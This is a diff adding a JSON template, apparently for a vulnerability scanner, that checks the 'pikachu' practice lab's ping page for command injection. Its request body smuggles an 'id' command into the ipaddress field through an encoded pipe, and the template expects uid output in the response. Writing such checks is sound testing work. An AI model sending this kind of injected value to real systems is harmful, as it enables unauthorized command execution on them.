@@ -1,0 +1,27 @@
+{
+    "name": "pikachu",
+    "vuln":"",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type":"1",
+    "mainRequest": {
+      "1": {
+        "request": {
+          "host": "",
+          "method": "POST",
+          "path": "/vul/rce/rce_ping.php",
+          "cookie": "",
+          "requestheader": "",
+          "requestbody": "ipaddress=%7Cid&submit=ping"
+        },
+        "response": {
+          "statuscode": "",
+          "statusmessage": "",
+          "responsetime": "",
+          "responseheader": "",
+          "responsebody": "uid=1000(www-data) gid=50(staff) groups=50(staff)"
+        }
+      }
+    }
+  }
+  
